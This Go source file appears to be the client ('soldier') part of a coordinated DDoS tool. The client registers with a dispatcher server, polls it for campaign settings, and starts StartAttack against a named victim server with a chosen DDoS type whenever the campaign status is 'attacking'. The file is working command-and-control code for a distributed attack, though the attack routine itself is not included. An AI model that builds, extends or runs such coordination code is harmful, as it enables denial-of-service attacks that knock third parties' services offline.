package client

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/fatih/color"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

type Client struct {
	http.Client      `json:"-"`
	Name             string `json:"name"`
	DispatcherServer string `json:"-"`
}

func (c *Client) GetCamp() CampAPI {
	//get request to dispatcher server /camp

	rq, err := http.NewRequest("GET", c.DispatcherServer+"/camp", nil)
	if err != nil {
		return CampAPI{}
	}
	do, err := c.Do(rq)
	defer do.Body.Close()

	if err != nil {
		var msg string
		_ = json.NewDecoder(do.Body).Decode(&msg)
		return CampAPI{}
	}
	var camp CampAPI
	err = json.NewDecoder(do.Body).Decode(&camp)
	if err != nil {
		return CampAPI{}
	}
	return camp
}

func (c *Client) JoinCamp() error {
	//post request to dispatcher server /camp/
	jr, err := json.Marshal(c)
	if err != nil {
		return err
	}
	rq, err := http.NewRequest("POST", c.DispatcherServer+"/camp", bytes.NewReader(jr))

	if err != nil {
		return err
	}
	do, err := c.Do(rq)

	if err != nil {
		return err
	}
	if do.StatusCode == http.StatusOK {
		return nil
	}
	fmt.Println(do.StatusCode)
	var msg string
	_ = json.NewDecoder(do.Body).Decode(&msg)
	return errors.New(msg)
}

func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI, logChan chan string) {
	defer func() {
		if r := recover(); r != nil {
			//clear screen
			fmt.Print("\033[H\033[2J")
			color.Red("Dispatcher server is stopped")
			os.Exit(0)
		}
	}()
	prevCmp := c.GetCamp()
	ChangedDataChan <- prevCmp
	stopchan := make(chan bool, 1)
	stopchan <- false

	var cmp CampAPI
	for {
		cmp = c.GetCamp()
		if yes, message := cmp.Equals(prevCmp); !yes {
			select {
			case <-ChangedDataChan:
			default:
			}
			ChangedDataChan <- cmp
			logChan <- message
			if cmp.Settings.Status == "attacking" {
				go StartAttack(cmp.Settings.VictimServer, cmp.Settings.DDOSType, stopchan, logChan)
			}
			if cmp.Settings.Status == "stopped" {
				select {
				case <-stopchan:
				default:
				}
				stopchan <- true
			}
			prevCmp = cmp
			time.Sleep(2 * time.Second)
		}
	}
}

func (c *Client) Start() {
	err := c.JoinCamp()
	if err != nil {
		if strings.Contains(err.Error(), "connection refused") {
			color.Red("Dispatcher server is not running")
			return
		} else {
			color.Red(err.Error())
			return
		}
	}
	var ChangedDataChan = make(chan CampAPI, 1)
	logChan := make(chan string, 1)

	wg := sync.WaitGroup{}
	wg.Add(1)
	go func() {
		c.ListenAndDo(ChangedDataChan, logChan)
		wg.Done()
	}()

	go func() {
		StartSoldierView(ChangedDataChan, logChan)
		wg.Done()
	}()
	wg.Wait()
}

func (c *Client) Ping() error {
	rq, err := http.NewRequest("GET", c.DispatcherServer+"/ping", nil)
	if err != nil {
		return err
	}
	do, err := c.Do(rq)
	if err != nil {
		return err
	}
	if do.StatusCode == http.StatusOK {
		return nil
	}
	return errors.New("error in pinging")
}
